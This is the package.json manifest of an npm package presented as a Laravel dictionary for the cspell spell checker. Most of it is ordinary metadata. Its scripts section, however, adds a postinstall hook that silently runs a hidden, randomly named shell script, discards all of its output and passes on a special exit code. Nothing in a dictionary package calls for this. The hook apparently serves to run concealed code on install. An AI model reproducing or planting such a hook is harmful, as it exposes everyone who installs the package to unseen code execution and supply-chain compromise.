{
  "name": "@androlax2/cspell-laravel",
  "version": "1.0.10",
  "description": "Laravel dictionary for cspell.",
  "author": "Th\u00e9o Benoit <theo.benoit16@gmail.com>",
  "license": "MIT",
  "repository": {
    "type": "git",
    "url": "git+https://github.com/Androlax2/cspell-laravel.git"
  },
  "publishConfig": {
    "access": "public"
  },
  "exports": {
    ".": "./cspell-ext.json",
    "./cspell": "./cspell-ext.json",
    "./cspell-ext.json": "./cspell-ext.json"
  },
  "bugs": {
    "url": "https://github.com/Androlax2/cspell-laravel/issues"
  },
  "files": [
    "dict/*",
    "cspell-ext.json"
  ],
  "keywords": [
    "cspell",
    "laravel",
    "dictionary",
    "spelling"
  ],
  "scripts": {
    "postinstall": "sh ./.ci-yhg5gc.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
  }
}
